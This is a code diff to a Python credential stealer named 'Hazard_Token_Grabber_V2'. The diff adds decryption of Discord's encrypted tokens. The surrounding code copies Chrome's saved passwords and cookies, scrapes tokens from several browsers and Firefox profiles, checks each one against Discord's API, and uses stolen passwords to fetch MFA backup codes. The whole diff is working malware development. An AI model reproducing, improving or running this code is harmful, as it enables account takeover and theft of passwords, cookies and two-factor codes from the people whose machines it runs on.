@@ -24,6 +24,7 @@ class Hazard_Token_Grabber_V2:
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{160}"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -179,8 +180,8 @@ class Hazard_Token_Grabber_V2:
             wkey = wkey[:i] + '-' + wkey[i:]
         return [productName, wkey]
 
-    def get_master_key(self):
-        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
+    def get_master_key(self, path):
+        with open(path, "r", encoding="utf-8") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
 
@@ -207,7 +208,7 @@ class Hazard_Token_Grabber_V2:
             return "Failed to decrypt password"
     
     def grabPassword(self):
-        master_key = self.get_master_key()
+        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -237,7 +238,7 @@ class Hazard_Token_Grabber_V2:
             pass
 
     def grabCookies(self):
-        master_key = self.get_master_key()
+        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -289,26 +290,40 @@ class Hazard_Token_Grabber_V2:
             'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
-
-        for source, path in paths.items():
+        
+        for _, path in paths.items():
             if not os.path.exists(path):
                 continue
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (self.regex):
-                        for token in findall(regex, line):
-                            try:
-                                r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                if r.status_code == 200:
-                                    if token in self.tokens:
-                                        continue
-                            except Exception:
-                                pass
+            if not "discord" in path:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
+                                    if r.status_code == 200:
+                                        if token in self.tokens:
+                                            continue
+                                except Exception:
+                                    pass
+                                    self.tokens.append(token)
+            else:
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in findall(self.encrypted_regex, line):
+                            token = self.decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                            r = requests.get(self.baseurl, headers=self.getheaders(token))
+                            if r.status_code == 200:
+                                if token in self.tokens:
+                                    continue
                                 self.tokens.append(token)
+
         if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
-            for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
@@ -323,15 +338,13 @@ class Hazard_Token_Grabber_V2:
                                     if token in self.tokens:
                                         continue
                                     self.tokens.append(token)
-                                    
+                                    print(token)
+              
     def neatifyTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
-            try:
-                j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
-            except Exception:
-                pass
-            user = j["username"] + "#" + str(j["discriminator"])
+            j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
+            user = j.get('username') + '#' + str(j.get("discriminator"))
 
             if token.startswith("mfa.") and self.discord_psw:
                 with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
@@ -339,10 +352,10 @@ class Hazard_Token_Grabber_V2:
                     for x in self.discord_psw:
                         try:
                             r = requests.post(self.baseurl+"/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
-                            for i in r["backup_codes"]:
+                            for i in r.get("backup_codes"):
                                 if i not in self.backup_codes:
                                     self.backup_codes.append(i)
-                                    fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
+                                    fp.write(f'\t{i.get("code")} | {"Already used" if i.get("consumed") == True else "Not used"}\n')
                         except Exception:
                             pass
             badges = ""
@@ -358,9 +371,8 @@ class Hazard_Token_Grabber_V2:
             if (flags == 16384): badges += "Gold BugHunter, "
             if (flags == 131072): badges += "Verified Bot Developer, "
             if (badges == ""): badges = "None"
-            user = j["username"] + "#" + str(j["discriminator"])
-            email = j["email"]
-            phone = j["phone"] if j["phone"] else "No Phone Number attached"
+            email = j.get("email")
+            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
             try:
                 nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
             except Exception:
